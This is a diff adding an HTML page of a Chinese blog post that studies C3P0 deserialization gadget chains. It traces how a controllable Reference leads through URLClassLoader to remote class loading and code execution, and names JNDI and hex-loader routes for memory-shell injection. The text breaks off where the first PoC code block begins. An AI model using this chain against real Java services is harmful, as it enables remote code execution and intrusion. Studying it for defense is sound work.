@@ -1,0 +1,1292 @@
+<!DOCTYPE html>
+<html itemscope itemtype="http://schema.org/WebPage" lang="en-us">
+  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+    
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+    <meta name="robots" content="noodp" />
+    <title>C3p0反序列化 - 6s6&#39;s blog</title><meta name="author" content="6s6">
+<meta name="description" content="description is here"><meta name="keywords" content='Java'>
+  <meta itemprop="name" content="C3p0反序列化">
+  <meta itemprop="description" content="description is here">
+  <meta itemprop="datePublished" content="2025-03-19T22:40:23+08:00">
+  <meta itemprop="dateModified" content="2025-03-19T22:40:23+08:00">
+  <meta itemprop="wordCount" content="1766">
+  <meta itemprop="keywords" content="Java"><meta property="og:url" content="http://localhost:1313/posts/44face1/">
+  <meta property="og:site_name" content="6s6&#39;s blog">
+  <meta property="og:title" content="C3p0反序列化">
+  <meta property="og:description" content="description is here">
+  <meta property="og:locale" content="en_us">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-03-19T22:40:23+08:00">
+    <meta property="article:modified_time" content="2025-03-19T22:40:23+08:00">
+    <meta property="article:tag" content="Java">
+
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="C3p0反序列化">
+  <meta name="twitter:description" content="description is here">
+<meta name="application-name" content="FixIt">
+<meta name="apple-mobile-web-app-title" content="FixIt"><meta name="theme-color" data-light="#f8f8f8" data-dark="#252627" content="#f8f8f8"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="canonical" type="text/html" href="http://localhost:1313/posts/44face1/" title="C3p0反序列化 - 6s6&#39;s blog" /><link rel="prev" type="text/html" href="http://localhost:1313/posts/c1e7c5b/" title="TPCTF2025部分wp" /><link rel="alternate" type="text/markdown" href="http://localhost:1313/posts/44face1/index.md" title="C3p0反序列化 - 6s6's blog"><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.removeAttribute('onload');this.rel='stylesheet'">
+    <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+  {
+    "@context": "http://schema.org",
+    "@type": "BlogPosting",
+    "headline": "C3p0反序列化",
+    "inLanguage": "en-us",
+    "mainEntityOfPage": {
+      "@type": "WebPage",
+      "@id": "http:\/\/localhost:1313\/posts\/44face1\/"
+    },"genre": "posts","keywords": "Java","wordcount":  1766 ,
+    "url": "http:\/\/localhost:1313\/posts\/44face1\/","datePublished": "2025-03-19T22:40:23+08:00","dateModified": "2025-03-19T22:40:23+08:00","publisher": {
+      "@type": "Organization",
+      "name": ""},"author": {
+        "@type": "Person",
+        "name": "6s6"
+      },"description": ""
+  }
+  </script><script src="/js/head/color-scheme.min.js"></script></head>
+  <body data-header-desktop="sticky" data-header-mobile="auto"><div class="wrapper" data-page-style="normal"><header class="desktop animate__faster" id="header-desktop">
+  <div class="header-wrapper">
+    <div class="header-title">
+      <a href="/" title="6s6&#39;s blog"><span class="typeit"><template>6s6&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+    <nav>
+      <ul class="menu"><li class="menu-item">
+              <a class="menu-link" href="/posts/">Posts</a></li><li class="menu-item">
+              <a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item">
+              <a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item">
+              <a class="menu-link" href="/links/" title="links">Links</a></li><li class="menu-item">
+              <a class="menu-link" href="/about/">About</a></li><li class="menu-item delimiter"></li><li class="menu-item search" id="search-desktop">
+            <input type="text" placeholder="搜索文章标题或内容……" id="search-input-desktop">
+            <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+              <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+            </a>
+            <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+              <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+            </a>
+            <span class="search-button search-loading" id="search-loading-desktop">
+              <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+            </span>
+          </li><li class="menu-item theme-switch" title="切换主题">
+          <i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i>
+        </li></ul>
+    </nav>
+  </div>
+</header><header class="mobile animate__faster" id="header-mobile">
+  <div class="header-container">
+    <div class="header-wrapper">
+      <div class="header-title">
+        <a href="/" title="6s6&#39;s blog"><span class="typeit"><template>6s6&#39;s blog</template></span></a><span class="header-subtitle"></span></div>
+      <div class="menu-toggle" id="menu-toggle-mobile">
+        <span></span><span></span><span></span>
+      </div>
+    </div>
+    <nav>
+      <ul class="menu" id="menu-mobile"><li class="search-wrapper">
+            <div class="search mobile" id="search-mobile">
+              <input type="text" placeholder="搜索文章标题或内容……" id="search-input-mobile">
+              <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                <i class="fa-solid fa-search fa-fw" aria-hidden="true"></i>
+              </a>
+              <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                <i class="fa-solid fa-times-circle fa-fw" aria-hidden="true"></i>
+              </a>
+              <span class="search-button search-loading" id="search-loading-mobile">
+                <i class="fa-solid fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+              </span>
+            </div>
+            <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+              取消
+            </a>
+          </li><li class="menu-item"><a class="menu-link" href="/posts/">Posts</a></li><li class="menu-item"><a class="menu-link" href="/categories/">Categories</a></li><li class="menu-item"><a class="menu-link" href="/tags/">Tags</a></li><li class="menu-item"><a class="menu-link" href="/links/" title="links">Links</a></li><li class="menu-item"><a class="menu-link" href="/about/">About</a></li><li class="menu-item menu-system">
+          <span class="menu-system-item theme-switch" title="切换主题"><i class="fa-solid fa-adjust fa-fw" aria-hidden="true"></i></span></li>
+      </ul>
+    </nav>
+  </div>
+</header><div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+  </div>
+  <div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+  </div><main class="container"><aside class="aside-collection animate__animated animate__fadeIn animate__faster" aria-label="合集"></aside>
+
+  <article class="page single">
+    <div class="header"><h1 class="single-title animate__animated animate__flipInX"><span>C3p0反序列化</span>
+      </h1></div><div class="post-meta">
+      <div class="post-meta-line"><span class="post-author"><span class="author"><img loading="lazy" src="https://bu.dusays.com/2024/12/26/676d23907280d.jpg" alt="6s6" data-title="6s6" width="20" height="20" class="avatar" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>&nbsp;6s6</span></span><span class="post-included-in">&nbsp;收录于 <a href="/categories/java/" class="post-category" title="分类 - Java"><i class="fa-regular fa-folder fa-fw" aria-hidden="true"></i> Java</a></span></div><div class="post-meta-line"><span title="发布于 2025-03-19 22:40:23"><i class="fa-solid fa-calendar-days fa-fw me-1" aria-hidden="true"></i><time datetime="2025-03-19">2025-03-19</time></span>&nbsp;<span title="1766 字"><i class="fa-solid fa-pencil-alt fa-fw me-1" aria-hidden="true"></i>约 1800 字</span>&nbsp;<span><i class="fa-regular fa-clock fa-fw me-1" aria-hidden="true"></i>预计阅读 9 分钟</span>&nbsp;</div>
+    </div><div class="details toc" id="toc-static" data-kept="false">
+        <div class="details-summary toc-title">
+          <span>目录</span>
+          <span><i class="details-icon fa-solid fa-angle-right" aria-hidden="true"></i></span>
+        </div>
+        <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#简介">简介</a></li>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#利用方式">利用方式</a>
+      <ul>
+        <li><a href="#urlclassloader远程类加载">URLClassLoader远程类加载</a>
+          <ul>
+            <li><a href="#调用链">调用链</a></li>
+            <li><a href="#poc">poc</a></li>
+            <li><a href="#总结">总结</a></li>
+          </ul>
+        </li>
+        <li><a href="#不出网利用">不出网利用</a>
+          <ul>
+            <li><a href="#调用链-1">调用链</a></li>
+            <li><a href="#poc-1">poc</a></li>
+            <li><a href="#总结-1">总结</a></li>
+          </ul>
+        </li>
+        <li><a href="#hex-base">hex base</a>
+          <ul>
+            <li><a href="#调用链-2">调用链</a></li>
+            <li><a href="#poc-2">poc</a></li>
+            <li><a href="#总结-2">总结</a></li>
+          </ul>
+        </li>
+        <li><a href="#jndi注入">JNDI注入</a>
+          <ul>
+            <li><a href="#调用链-3">调用链</a></li>
+            <li><a href="#poc-3">poc</a></li>
+            <li><a href="#总结-3">总结</a></li>
+          </ul>
+        </li>
+      </ul>
+    </li>
+    <li><a href="#总结-4">总结</a></li>
+    <li><a href="#参考">参考</a></li>
+  </ul>
+</nav></div>
+      </div><div class="content" id="content"><h2 id="c3p0反序列化学习" class="heading-element"><span>c3p0反序列化学习</span>
+  <a href="#c3p0%e5%8f%8d%e5%ba%8f%e5%88%97%e5%8c%96%e5%ad%a6%e4%b9%a0" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h2 id="前言" class="heading-element"><span>前言</span>
+  <a href="#%e5%89%8d%e8%a8%80" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>早早早早该学的，太懒了拖到现在😿😿😿</p>
+<h2 id="简介" class="heading-element"><span>简介</span>
+  <a href="#%e7%ae%80%e4%bb%8b" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>C3P0是JDBC的一个连接池组件</p>
+<p>在多线程中创建线程是一个昂贵的操作，如果有大量的小任务需要执行，并且频繁地创建和销毁线程，实际上会消耗大量的系统资源，往往创建和消耗线程所耗费的时间比执行任务的时间还长。为了提高效率，我们可以线程池，而连接池也是差不多的原理，其核心作用是预先创建并维护一定数量的数据库连接，供应用程序使用，从而避免频繁创建和关闭连接带来的性能开销。</p>
+<p><strong>C3P0是</strong>一个开源的JDBC连接池，它实现了数据源和JNDI绑定，支持JDBC3规范和JDBC2的标准扩展。 使用它的开源项目有Hibernate、Spring等。</p>
+<h2 id="环境搭建" class="heading-element"><span>环境搭建</span>
+  <a href="#%e7%8e%af%e5%a2%83%e6%90%ad%e5%bb%ba" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>添加依赖</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">&lt;dependency&gt;
+</span></span><span class="line"><span class="cl">    &lt;groupId&gt;com.mchange&lt;/groupId&gt;
+</span></span><span class="line"><span class="cl">    &lt;artifactId&gt;c3p0&lt;/artifactId&gt;
+</span></span><span class="line"><span class="cl">    &lt;version&gt;0.9.5.2&lt;/version&gt;
+</span></span><span class="line"><span class="cl">&lt;/dependency&gt;</span></span></code></pre></td></tr></table>
+</div>
+</div><h2 id="利用方式" class="heading-element"><span>利用方式</span>
+  <a href="#%e5%88%a9%e7%94%a8%e6%96%b9%e5%bc%8f" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>在C3P0中有三种利用方式</p>
+<ul>
+<li>URLClassLoader远程类加载，也被称为 http base 链</li>
+<li>JNDI</li>
+<li>HEX序列化字节加载器</li>
+</ul>
+<p>在原生的反序列化中如果找不到其他链，则可尝试C3P0去加载远程的类进行命令执行。JNDI则适用于Jackson等利用。而HEX序列化字节加载器的方式可以利用与fj和Jackson等不出网情况下打入内存马使用。</p>
+<h3 id="urlclassloader远程类加载" class="heading-element"><span>URLClassLoader远程类加载</span>
+  <a href="#urlclassloader%e8%bf%9c%e7%a8%8b%e7%b1%bb%e5%8a%a0%e8%bd%bd" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><h4 id="调用链" class="heading-element"><span>调用链</span>
+  <a href="#%e8%b0%83%e7%94%a8%e9%93%be" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><p><code>com.mchange.v2.c3p0.impl</code> 下的 <code>PoolBackedDataSourceBase</code> 类</p>
+<p>其 <code>writeObject</code> 方法中有</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/18/67d95ec4495c1.png" alt="image-20250316130422371" srcset="https://bu.dusays.com/2025/03/18/67d95ec4495c1.png?size=small, https://bu.dusays.com/2025/03/18/67d95ec4495c1.png?size=medium 1.5x, https://bu.dusays.com/2025/03/18/67d95ec4495c1.png?size=large 2x" data-title="image-20250316130422371" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>先用 <code>SerializableUtils.toByteArray</code> 检查 <code>connectionPoolDataSource</code> 属性是否可序列化，如果可以则直接序列化，如果不行则用 <code>ReferenceIndirector.indirectForm</code> 方法处理后再进行序列化操作</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/18/67d95ec40f228.png" alt="image-20250316135438868" srcset="https://bu.dusays.com/2025/03/18/67d95ec40f228.png?size=small, https://bu.dusays.com/2025/03/18/67d95ec40f228.png?size=medium 1.5x, https://bu.dusays.com/2025/03/18/67d95ec40f228.png?size=large 2x" data-title="image-20250316135438868" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这是个接口，不能被序列化所以会进入到 catch 块，我们跟进下看这个方法怎么处理的</p>
+<p><code>com.mchange.v2.naming</code> 下的 <code>ReferenceIndirector.indirectForm</code> 方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">public</span> <span class="n">IndirectlySerialized</span> <span class="n">indirectForm</span><span class="p">(</span><span class="ne">Object</span> <span class="n">var1</span><span class="p">)</span> <span class="n">throws</span> <span class="n">Exception</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">        <span class="ne">Reference</span> <span class="n">var2</span> <span class="o">=</span> <span class="p">((</span><span class="n">Referenceable</span><span class="p">)</span><span class="n">var1</span><span class="p">)</span><span class="o">.</span><span class="n">getReference</span><span class="p">();</span>
+</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">new</span> <span class="n">ReferenceSerialized</span><span class="p">(</span><span class="n">var2</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">name</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">contextName</span><span class="p">,</span> <span class="n">this</span><span class="o">.</span><span class="n">environmentProperties</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">    <span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>调用了 <code>connectionPoolDataSource</code> 属性的 <code>getReference</code>方法，并用返回结果作为参数实例化一个<code>ReferenceSerialized</code> 对象，然后将这个对象返回，跟进 <code>ReferenceSerialized</code> 的构造方法可以发现 <code>reference</code> 就是传入的 <code>connectionPoolDataSource </code> 属性，是我们可控的</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="n">ReferenceSerialized</span><span class="p">(</span><span class="ne">Reference</span> <span class="n">var1</span><span class="p">,</span> <span class="n">Name</span> <span class="n">var2</span><span class="p">,</span> <span class="n">Name</span> <span class="n">var3</span><span class="p">,</span> <span class="n">Hashtable</span> <span class="n">var4</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">reference</span> <span class="o">=</span> <span class="n">var1</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">name</span> <span class="o">=</span> <span class="n">var2</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">contextName</span> <span class="o">=</span> <span class="n">var3</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">    <span class="n">this</span><span class="o">.</span><span class="n">env</span> <span class="o">=</span> <span class="n">var4</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>说完了序列化，看下其对应的反序列化操作，还是 <code>com.mchange.v2.c3p0.impl</code> 下的 <code>PoolBackedDataSourceBase</code></p>
+<p>其 <code>readObejct</code> 方法</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/18/67d95ec442753.png" alt="image-20250316132105834" srcset="https://bu.dusays.com/2025/03/18/67d95ec442753.png?size=small, https://bu.dusays.com/2025/03/18/67d95ec442753.png?size=medium 1.5x, https://bu.dusays.com/2025/03/18/67d95ec442753.png?size=large 2x" data-title="image-20250316132105834" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>可以看到会调用序列流中的对象为 <code>IndirectlySerialized</code> 类型的 <code>getObject</code> 方法，而刚才在分析序列化时，我们发现 <code>ReferenceIndirector.indirectForm</code> 方法返回的 <code>ReferenceSerialized</code> 对象就是 <code>IndirectlySerialized</code> 类型的。也就是说如果 <code>ReferenceSerialized</code> 被序列化成功了，那这里就是调用的<code>ReferenceSerialized#getObject</code> ，跟进一下</p>
+<p>跟进后可以发现调用了 <code>ReferenceableUtils.referenceToObject</code> 这个静态方法</p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/18/67d95ec44c55c.png" alt="image-20250316133354263" srcset="https://bu.dusays.com/2025/03/18/67d95ec44c55c.png?size=small, https://bu.dusays.com/2025/03/18/67d95ec44c55c.png?size=medium 1.5x, https://bu.dusays.com/2025/03/18/67d95ec44c55c.png?size=large 2x" data-title="image-20250316133354263" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>上面说过 <code>reference</code> 就是传入的 <code>connectionPoolDataSource </code> 属性，是我们可控的。继续跟进</p>
+<p><code>com.mchange.v2.naming</code> 下的 <code>ReferenceableUtils.referenceToObject</code></p>
+<p><img loading="lazy" src="https://bu.dusays.com/2025/03/19/67dad775831ec.png" alt="image-20250319221134650" srcset="https://bu.dusays.com/2025/03/19/67dad775831ec.png?size=small, https://bu.dusays.com/2025/03/19/67dad775831ec.png?size=medium 1.5x, https://bu.dusays.com/2025/03/19/67dad775831ec.png?size=large 2x" data-title="image-20250319221134650" style="background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/></p>
+<p>这里<code>var4</code> 是从传入的 <code>Reference</code> 对象中获取的工厂类名称，由上面的分析来看，是可控的，所以这里我们可以通过 <code>URLClassLoader</code> 实例化远程类，造成任意代码执行</p>
+<p>这里因为实现了 <code>ConnectionPoolDataSource</code> 接口，且 <code>ConnectionPoolDataSource </code> 接口继承于 <code>CommonDataSource</code> ，所以必须实现其所有方法</p>
+<h4 id="poc" class="heading-element"><span>poc</span>
+  <a href="#poc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h4><div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
